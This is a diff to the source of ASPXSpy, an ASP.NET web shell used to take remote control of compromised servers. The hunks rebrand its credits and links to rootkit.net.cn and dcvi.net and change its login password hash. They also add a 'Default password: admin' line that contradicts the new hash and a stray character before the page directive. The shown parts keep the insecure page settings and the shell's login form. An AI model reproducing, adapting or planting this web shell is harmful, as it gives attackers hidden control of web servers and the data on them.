@@ -1,4 +1,4 @@
-<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%>
+v<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%>
 <%@ import Namespace="System.IO"%>
 <%@ import Namespace="System.Diagnostics"%>
 <%@ import Namespace="System.Data"%>
@@ -24,10 +24,10 @@
 Thanks Snailsor,FuYu,BloodSword,Cnqing,
 Code by Bin
 Make in China
-Blog: http://alikaptanoglu.blogspot.com
-E-mail : ali_kaptanoglu@hotmail.com
+Blog: http://www.rootkit.net.cn
+E-mail : master@rootkit.net.cn
 */
-public string Password="21232f297a57a5a743894a0e4a801fc3";//admin
+public string Password="4d934e4cde0dce1d9b3ecaf84f5672b2";//P@ssw0rd.
 public string vbhLn="ASPXSpy";
 public int TdgGU=1;
 protected OleDbConnection Dtdr=new OleDbConnection();
@@ -2313,7 +2313,7 @@ yhv.Visible=false;
 <html xmlns="http://www.w3.org/1999/xhtml" >
 <head id="Head1" runat="server">
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
-<title>ASPXspy</title>
+<title>ASPXspy - DCVI.NET</title>
 <style type="text/css">
 .Bin_Style_Login{font:11px Verdana;BACKGROUND: #FFFFFF;border: 1px solid #666666;}
 body,td{font: 12px Arial,Tahoma;line-height: 16px;}
@@ -2351,7 +2351,8 @@ e.checked=form.chkall.checked;
 <span style="font:11px Verdana;">Password:</span>
 <asp:TextBox ID="HRJ" runat="server" Columns="20" CssClass="Bin_Style_Login" ></asp:TextBox>
 <asp:Button ID="ZSnXu" runat="server" Text="Login" CssClass="Bin_Style_Login" OnClick="xVm"/><p/>
-Copyright &copy; 2009 Bin -- <a href="http://www.rootkit.net.cn" target="_blank">www.rootkit.net.cn</a>
+Default password: admin
+Copyright &copy; 2009 Bin --  ROOT Shell Devoloper <a href="http://www.dcvi.net" target="_blank">www.dcvi.net</a>
 </div>
 <div id="ZVS" runat="server">
 <div id="Zzj" runat="server">
@@ -2581,7 +2582,7 @@ SQLExec : <asp:DropDownList runat="server" ID="FGEy" AutoPostBack="True" OnSelec
 </asp:Table>
 </div>
 </td></tr></table>
-<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">Copyright &copy; 2006-2009 <a href="http://alikaptanoglu.blogspot.com" target="_blank">Shell sql tool</a> All Rights Reserved.</div></div>
+<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">Copyright &copy; 2006-2009 <a href="http://www.rootkit.net.cn" target="_blank">Bin'Blog</a> All Rights Reserved.</div></div>
 </form>
 </body>
 </html>
